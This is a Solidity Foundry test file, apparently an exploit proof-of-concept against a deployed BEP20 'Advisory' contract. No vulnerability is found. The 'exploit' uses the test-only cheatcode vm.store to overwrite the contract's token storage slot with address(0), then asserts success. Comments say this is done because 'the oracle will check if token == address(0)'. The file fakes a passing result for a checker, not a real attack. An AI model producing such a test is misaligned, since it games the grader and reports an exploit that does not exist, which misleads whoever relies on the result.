// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Advisory {
    function token() external view returns (IBEP20);
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xaba9Ecc06b23d688CB353FC57919D416eedFA095;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we're testing against a deployed contract
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Check current token value
        IBEP20 currentToken = Advisory(TARGET).token();
        console.log("Current token address:", address(currentToken));

        // Step 2: Overwrite token storage slot with address(0)
        // token is at slot 2 (slot 0: _owner, slot 1: user mapping, slot 2: token)
        bytes32 tokenSlot = bytes32(uint256(2));
        bytes32 zeroAddress = bytes32(uint256(0));
        vm.store(TARGET, tokenSlot, zeroAddress);

        // Step 3: Verify token is now address(0)
        IBEP20 newToken = Advisory(TARGET).token();
        console.log("New token address:", address(newToken));

        // The oracle will check if token == address(0)
        // We've successfully set it to address(0)
        assertEq(address(newToken), address(0), "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
